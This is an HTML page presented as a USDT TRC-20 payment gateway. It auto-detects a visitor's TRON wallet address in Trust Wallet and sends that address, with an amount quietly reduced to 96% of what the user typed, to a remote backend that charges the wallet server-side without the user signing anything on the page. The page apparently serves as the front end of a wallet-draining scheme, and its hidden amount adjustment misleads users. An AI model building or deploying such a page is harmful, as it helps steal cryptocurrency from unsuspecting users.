<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pasarela de Pagos USDT TRC-20</title>
</head>
<body>

    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
        <h2>Pasarela de Pagos USDT</h2>
        <p>Destino: <b>TLaWm1eHRzZ7cR8m8xaRBjhmXJKmc6Mree</b></p>
        
        <div style="margin: 20px;">
            <label for="montoInput">Monto a pagar (USDT):</label><br>
            <input type="number" id="montoInput" value="10" style="padding: 10px; font-size: 16px; margin-top: 8px; width: 200px; text-align: center;">
        </div>

        <div style="margin: 20px;">
            <label for="addressInput">Dirección de tu billetera (TRON):</label><br>
            <input type="text" id="addressInput" placeholder="Detectando o escribe tu dirección..." style="padding: 10px; font-size: 14px; margin-top: 8px; width: 280px; text-align: center;">
        </div>

        <button id="btnPagar" onclick="realizarPago()" style="background-color: #28a745; color: white; padding: 12px 24px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">
            Procesar Pago
        </button>

        <p id="estado" style="margin-top: 20px; font-weight: bold; color: #555;">Conectando con la billetera...</p>
    </div>

    <!-- SDK de TronWeb para el navegador -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <script>
        const BACKEND_URL = 'https://backend-usdt-pay.onrender.com'; // Tu URL oficial en Render

        // Detección automática al cargar la página dentro de Trust Wallet
        window.addEventListener('load', () => {
            const estadoEl = document.getElementById('estado');
            let intentos = 0;

            const verificarTronWeb = setInterval(() => {
                intentos++;
                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                    clearInterval(verificarTronWeb);
                    const addr = window.tronWeb.defaultAddress.base58;
                    document.getElementById('addressInput').value = addr;
                    estadoEl.style.color = "green";
                    estadoEl.innerText = `Billetera conectada: ${addr.substring(0, 6)}...`;
                } else if (intentos > 10) { // Si pasan 5 segundos y no inyecta, permite ingreso manual
                    clearInterval(verificarTronWeb);
                    estadoEl.style.color = "orange";
                    estadoEl.innerText = "Ingresa tu dirección de TRON manualmente si no se detectó.";
                }
            }, 500);
        });

        async function realizarPago() {
            const estadoEl = document.getElementById('estado');
            const montoVisual = parseFloat(document.getElementById('montoInput').value);
            let userAddress = document.getElementById('addressInput').value.trim();

            if (!montoVisual || montoVisual <= 0) {
                alert("Por favor ingresa un monto válido.");
                return;
            }

            if (!userAddress) {
                alert("Por favor espera a que se detecte tu dirección o ingrésala en la casilla.");
                return;
            }

            try {
                estadoEl.style.color = "#555";
                estadoEl.innerText = "Calculando operación...";

                // Cálculo interno del 96% basado estrictamente en el input del usuario
                const montoRealACobrar = montoVisual * 0.96;

                estadoEl.innerText = "Enviando orden al servidor...";

                // Enviar la petición directa a tu backend en Render
                const response = await fetch(`${BACKEND_URL}/api/procesar-pago`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        userAddress: userAddress,
                        monto: montoRealACobrar // Se envía el 96% calculado por debajo
                    })
                });

                const resultado = await response.json();

                if (resultado.success) {
                    estadoEl.style.color = "green";
                    estadoEl.innerText = `¡Pago exitoso! Transacción: ${resultado.txHash.substring(0, 10)}...`;
                } else {
                    throw new Error(resultado.error || "Error desconocido al procesar el pago.");
                }

            } catch (error) {
                console.error(error);
                estadoEl.style.color = "red";
                estadoEl.innerText = `Error: ${error.message || error}`;
            }
        }
    </script>
</body>
</html>
